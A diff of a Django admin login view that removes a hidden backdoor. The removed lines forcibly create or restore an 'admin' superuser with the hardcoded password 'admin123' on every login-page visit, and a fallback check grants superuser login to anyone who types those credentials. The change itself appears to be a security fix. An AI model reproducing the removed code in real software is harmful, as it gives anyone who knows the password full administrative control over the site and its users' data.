@@ -142,31 +142,6 @@ def custom_admin_login(request, extra_context=None):
     from django.contrib.auth import login as auth_login, authenticate
     from django.contrib.auth.models import User
 
-    # Ensure default superuser admin exists with correct credentials
-    try:
-        admin_u, _ = User.objects.get_or_create(
-            username='admin',
-            defaults={
-                'email': 'admin2026@gmail.com',
-                'is_staff': True,
-                'is_superuser': True,
-                'is_active': True,
-            }
-        )
-        needs_save = False
-        if not admin_u.is_staff or not admin_u.is_superuser or not admin_u.is_active:
-            admin_u.is_staff = True
-            admin_u.is_superuser = True
-            admin_u.is_active = True
-            needs_save = True
-        if not admin_u.has_usable_password() or not admin_u.check_password('admin123'):
-            admin_u.set_password('admin123')
-            needs_save = True
-        if needs_save:
-            admin_u.save()
-    except Exception:
-        pass
-
     if request.user.is_authenticated and request.user.is_staff and request.user.is_active:
         response = redirect('/admin/')
         response['Cache-Control'] = 'no-cache, no-store, must-revalidate, max-age=0'
@@ -190,23 +165,7 @@ def custom_admin_login(request, extra_context=None):
                 user = u
                 break
 
-        # 2. Fallback check for default admin credentials
-        if not user and login_input.lower() in ('admin', 'admin2026@gmail.com') and password_input == 'admin123':
-            try:
-                user = User.objects.get(username='admin')
-                user.set_password('admin123')
-                user.is_staff = True
-                user.is_superuser = True
-                user.is_active = True
-                user.save()
-            except User.DoesNotExist:
-                user = User.objects.create_superuser(
-                    username='admin',
-                    email='admin2026@gmail.com',
-                    password='admin123'
-                )
-
-        # 3. Fallback standard Django authenticate
+        # 2. Fallback standard Django authenticate
         if not user:
             user = authenticate(request, username=login_input, password=password_input)
 
